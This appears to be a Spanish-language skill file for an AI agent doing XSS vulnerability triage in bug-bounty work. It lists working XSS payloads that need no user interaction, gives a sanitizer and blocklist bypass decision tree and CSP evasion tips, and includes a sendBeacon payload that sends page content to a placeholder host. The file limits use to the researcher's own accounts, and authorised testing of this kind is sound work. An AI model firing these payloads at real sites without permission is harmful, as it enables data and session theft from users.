---
name: xss-sink-triage
description: Triaje de XSS dirigido por el contexto del sink y por lo que sobrevive al sanitizador. Prioriza vectores sin interaccion y mide impacto real antes de reportar.
model: claude-opus-5
---

# 0 — SEÑAL CITADA

> PortSwigger XSS cheat sheet, pagina actualizada 2026-10-21. Encabezado literal:
> **"Event handlers that do not require user interaction."**

Dos vectores literales de esa seccion que anclan toda la skill:

```html
<audio src/onerror=alert(1)>
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
```

El primero es el mas corto del catalogo y **no necesita ningun recurso externo**: el
evento que dispara ES el fallo de carga. El segundo usa una etiqueta inventada
(`<xss>`), asi que esquiva cualquier lista negra de nombres de etiqueta.

Principio que ordena el trabajo: **lo que importa no es qué payload ejecuta, sino qué
sobrevive al sanitizador.** El vector se deduce de lo que sobrevive, no al contrario.

---

# 1 — Arbol de decision (coste creciente)

## Paso 1 — ¿Qué sobrevive? (coste: 1 peticion)
Inyectar una sonda inerte, sin handler ni script:

```html
<xss style=x foo=bar>
```

Leer el DOM renderizado y anotar, por separado:
- ¿sobrevive `<` y `>`?
- ¿sobrevive una etiqueta **desconocida**?
- ¿sobrevive el atributo `style`?
- ¿sobrevive un atributo arbitrario?

- **`<` y `>` codificados** -> PARAR. No hay inyeccion de etiqueta.

## Paso 2 — Elegir vector segun lo que sobrevivio (coste: 1-3 peticiones)
No probar payloads al azar. Mapear:

| Sobrevive | Vector |
|---|---|
| `style` + `<style>` | eventos de animacion CSS (3 motores) |
| etiquetas `audio`/`video` | `<audio src/onerror=alert(1)>` — el mas corto |
| atributos arbitrarios | `autofocus` + `tabindex` + `onfocus` |
| SVG | `<svg><animate onbegin=... attributeName=x dur=1s>` |
| solo campos `hidden` | `oncontentvisibilityautostatechange`, `onbeforematch` |
| `style` pero no `<style>` | `content-visibility:auto` (no necesita keyframes) |

## Paso 3 — ¿Lista negra enumerada o patron? (coste: 2 peticiones)
Probar un handler conocido y uno moderno y largo:

```html
onerror=alert(1)
oncontentvisibilityautostatechange=alert(1)
```

- **Bloquea el primero, pasa el segundo** -> la lista es **enumerada**: hay mas huecos
  y conviene reportar la debilidad del filtro, no solo el vector concreto.
- **Bloquea ambos** -> filtra por patron `^on`. Buscar sinks sin `on*` (`javascript:`,
  `srcdoc`, SVG `xlink:href`).

## Paso 4 — ¿Hay CSP? (coste: 1 peticion + consola)
Leer `Content-Security-Policy` y la consola del navegador.

- **Sin `unsafe-inline`** -> los handlers inline no ejecutan. PARAR con los vectores de
  atributo y buscar `script-src` permisivo, `nonce` reutilizado o un dominio
  permitido que aloje contenido del atacante.
- **`connect-src` restrictivo** -> la exfiltracion esta limitada; el impacto baja de
  robo de datos a defacement. Anotarlo: cambia la severidad.

## Paso 5 — Verificar compatibilidad de navegador (coste: 2-3 ejecuciones)
Varios vectores son de un solo motor, segun la fuente:

- `onbeforematch` + `hidden=until-found`: **solo Firefox**
- `oncuechange` (WebVTT): **solo Chrome**
- `onanimationcancel`, `onbeforeprint`, `onbeforeunload`: **no en Safari**

Un PoC que el triador abre en otro navegador se cierra como no reproducible. Declarar
el navegador en el informe.

## Paso 6 — Convertir ejecucion en impacto (coste: alto)
`alert(1)` no es un informe. Exfiltrar desde una cuenta **propia**:

```html
<body onbeforeunload=navigator.sendBeacon('//HOST-PROPIO/',document.body.innerHTML)>
```

Limite etico y de alcance: dirigir SOLO a cuentas propias del investigador y a un host
bajo su control. Demostrar la capacidad basta; recolectar datos de usuarios reales
excede el permiso de cualquier programa.

---

# 2 — Trampas de falso positivo

**1. `alert` de otro sink.** El alert puede venir de otro punto de la pagina, no del
payload. Señal de muerte: usar un marcador unico (`alert(document.domain+'-A7X')`) y
no verlo en la ejecucion.

**2. Ejecucion solo en la consola del propio investigador.** Pegar el payload en la
consola prueba que el navegador ejecuta JS, no que haya XSS. Señal de muerte: el
payload no ejecuta al cargar la URL en una ventana privada, sin sesion previa.

**3. Self-XSS presentado como XSS.** Si el payload solo ejecuta en el navegador de
quien lo introduce y no hay forma de que lo reciba otro usuario, no es vulnerabilidad.
Señal de muerte: no se puede completar la frase "un atacante consigue X sobre la
victima Y". Esta trampa es la que mas informes invalida.

---

# 3 — Cuándo esta skill NO es la correcta

- El payload no ejecuta pero **el DOM revela datos** de otros usuarios: es fuga de
  informacion -> `writeups/info-disclosure/`
- El sink esta en un listener de `postMessage` o en un flujo OAuth
  -> `skill:oauth-flow-audit`
- La inyeccion es del lado servidor (plantilla, SQL, comando), no en el navegador
  -> `skill:ssrf-escalation` para SSRF, o `writeups/inyeccion/`
- El SVG malicioso se **sube** como fichero y se sirve desde otro origen: el problema
  es de aislamiento de origen, no de sanitizacion de HTML.

---

# 4 — Output

Escribir en `evidencias/xss-sink-triage-<slug>.md`:

- resultado de la sonda inerte: qué sobrevivio, campo por campo
- vector elegido y **por qué** (la fila de la tabla del paso 2)
- si la lista negra es enumerada o por patron
- CSP observada y su efecto sobre ejecucion y exfiltracion
- navegador y version donde se verifico
- marcador unico usado y su aparicion
- las tres trampas de falso positivo, con resultado
- la frase de impacto completada: atacante / qué / sobre quién
